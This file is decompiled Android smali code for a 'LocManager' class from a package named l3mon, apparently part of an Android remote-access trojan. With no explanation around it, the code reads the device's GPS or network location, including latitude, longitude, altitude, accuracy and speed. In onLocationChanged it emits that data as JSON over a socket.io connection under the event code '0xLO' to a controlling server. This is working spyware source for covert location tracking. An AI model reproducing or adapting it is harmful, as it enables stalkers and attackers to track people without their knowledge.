.class public Lcom/etechd/l3mon/LocManager;
.super Ljava/lang/Object;
.source "LocManager.java"

# interfaces
.implements Landroid/location/LocationListener;


# static fields
.field private static final MIN_DISTANCE_CHANGE_FOR_UPDATES:J = 0xaL

.field private static final MIN_TIME_BW_UPDATES:J = 0xea60L


# instance fields
.field accuracy:F

.field altitude:D

.field canGetLocation:Z

.field isGPSEnabled:Z

.field isNetworkEnabled:Z

.field latitude:D

.field location:Landroid/location/Location;

.field protected locationManager:Landroid/location/LocationManager;

.field longitude:D

.field private final mContext:Landroid/content/Context;

.field speed:F


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 41
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 21
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isGPSEnabled:Z

    .line 22
    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isNetworkEnabled:Z

    .line 23
    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->canGetLocation:Z

    .line 42
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/etechd/l3mon/LocManager;->mContext:Landroid/content/Context;

    .line 43
    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;

    .line 46
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 21
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isGPSEnabled:Z

    .line 22
    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isNetworkEnabled:Z

    .line 23
    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->canGetLocation:Z

    .line 47
    iput-object p1, p0, Lcom/etechd/l3mon/LocManager;->mContext:Landroid/content/Context;

    .line 48
    invoke-virtual {p0}, Lcom/etechd/l3mon/LocManager;->getLocation()Landroid/location/Location;

    .line 49
    return-void
.end method


# virtual methods
.method public canGetLocation()Z
    .locals 1

    .line 107
    iget-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->canGetLocation:Z

    return v0
.end method

.method public getData()Lorg/json/JSONObject;
    .locals 4

    .line 111
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 112
    .local v0, "data":Lorg/json/JSONObject;
    iget-object v1, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    if-eqz v1, :cond_0

    .line 114
    :try_start_0
    const-string v1, "enabled"

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 115
    const-string v1, "latitude"

    iget-wide v2, p0, Lcom/etechd/l3mon/LocManager;->latitude:D

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 116
    const-string v1, "longitude"

    iget-wide v2, p0, Lcom/etechd/l3mon/LocManager;->longitude:D

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 117
    const-string v1, "altitude"

    iget-wide v2, p0, Lcom/etechd/l3mon/LocManager;->altitude:D

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 118
    const-string v1, "accuracy"

    iget v2, p0, Lcom/etechd/l3mon/LocManager;->accuracy:F

    float-to-double v2, v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 119
    const-string v1, "speed"

    iget v2, p0, Lcom/etechd/l3mon/LocManager;->speed:F

    float-to-double v2, v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 121
    return-object v0

    .line 122
    :catch_0
    move-exception v1

    .local v1, "e":Lorg/json/JSONException;
    return-object v0

    .line 123
    .end local v1    # "e":Lorg/json/JSONException;
    :cond_0
    return-object v0
.end method

.method public getLocation()Landroid/location/Location;
    .locals 5

    .line 54
    const-string v0, "network"

    const-string v1, "gps"

    :try_start_0
    iget-object v2, p0, Lcom/etechd/l3mon/LocManager;->mContext:Landroid/content/Context;

    const-string v3, "location"

    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/location/LocationManager;

    iput-object v2, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;

    .line 56
    iget-object v2, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;

    invoke-virtual {v2, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v2

    iput-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->isGPSEnabled:Z

    .line 58
    iget-object v2, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;

    invoke-virtual {v2, v0}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v2

    iput-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->isNetworkEnabled:Z

    .line 60
    iget-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->isGPSEnabled:Z

    if-nez v2, :cond_0

    iget-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->isNetworkEnabled:Z

    if-eqz v2, :cond_2

    .line 62
    :cond_0
    const/4 v2, 0x1

    iput-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->canGetLocation:Z

    .line 63
    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const-string v3, "android.permission.ACCESS_FINE_LOCATION"

    sget-object v4, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Landroid/content/pm/PackageManager;->checkPermission(Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_2

    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    .line 64
    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const-string v3, "android.permission.ACCESS_COARSE_LOCATION"

    sget-object v4, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Landroid/content/pm/PackageManager;->checkPermission(Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_2

    .line 66
    iget-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->isNetworkEnabled:Z

    if-eqz v2, :cond_1

    .line 68
    iget-object v2, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;

    if-eqz v2, :cond_1

    .line 69
    iget-object v2, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;

    invoke-virtual {v2, v0}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    iput-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    .line 70
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    if-eqz v0, :cond_1

    .line 71
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v2

    iput-wide v2, p0, Lcom/etechd/l3mon/LocManager;->latitude:D

    .line 72
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v2

    iput-wide v2, p0, Lcom/etechd/l3mon/LocManager;->longitude:D

    .line 73
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getAltitude()D

    move-result-wide v2

    iput-wide v2, p0, Lcom/etechd/l3mon/LocManager;->altitude:D

    .line 74
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getAccuracy()F

    move-result v0

    iput v0, p0, Lcom/etechd/l3mon/LocManager;->accuracy:F

    .line 75
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getSpeed()F

    move-result v0

    iput v0, p0, Lcom/etechd/l3mon/LocManager;->speed:F

    .line 81
    :cond_1
    iget-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isGPSEnabled:Z

    if-eqz v0, :cond_2

    .line 82
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    if-nez v0, :cond_2

    .line 84
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;

    if-eqz v0, :cond_2

    .line 85
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    iput-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    .line 86
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    if-eqz v0, :cond_2

    .line 87
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->latitude:D

    .line 88
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->longitude:D

    .line 89
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getAltitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->altitude:D

    .line 90
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getAccuracy()F

    move-result v0

    iput v0, p0, Lcom/etechd/l3mon/LocManager;->accuracy:F

    .line 91
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getSpeed()F

    move-result v0

    iput v0, p0, Lcom/etechd/l3mon/LocManager;->speed:F
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 101
    :cond_2
    goto :goto_0

    .line 99
    :catch_0
    move-exception v0

    .line 100
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 103
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;

    return-object v0
.end method

.method public onLocationChanged(Landroid/location/Location;)V
    .locals 4
    .param p1, "location"    # Landroid/location/Location;

    .line 128
    if-eqz p1, :cond_0

    .line 129
    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->latitude:D

    .line 130
    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->longitude:D

    .line 131
    invoke-virtual {p1}, Landroid/location/Location;->getAltitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->altitude:D

    .line 132
    invoke-virtual {p1}, Landroid/location/Location;->getAccuracy()F

    move-result v0

    iput v0, p0, Lcom/etechd/l3mon/LocManager;->accuracy:F

    .line 133
    invoke-virtual {p1}, Landroid/location/Location;->getSpeed()F

    move-result v0

    iput v0, p0, Lcom/etechd/l3mon/LocManager;->speed:F

    .line 135
    :cond_0
    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;

    move-result-object v0

    invoke-virtual {v0}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v0

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    invoke-virtual {p0}, Lcom/etechd/l3mon/LocManager;->getData()Lorg/json/JSONObject;

    move-result-object v3

    aput-object v3, v1, v2

    const-string v2, "0xLO"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 136
    return-void
.end method

.method public onProviderDisabled(Ljava/lang/String;)V
    .locals 0
    .param p1, "provider"    # Ljava/lang/String;

    .line 140
    return-void
.end method

.method public onProviderEnabled(Ljava/lang/String;)V
    .locals 0
    .param p1, "provider"    # Ljava/lang/String;

    .line 144
    return-void
.end method

.method public onStatusChanged(Ljava/lang/String;ILandroid/os/Bundle;)V
    .locals 0
    .param p1, "provider"    # Ljava/lang/String;
    .param p2, "status"    # I
    .param p3, "extras"    # Landroid/os/Bundle;

    .line 148
    return-void
.end method
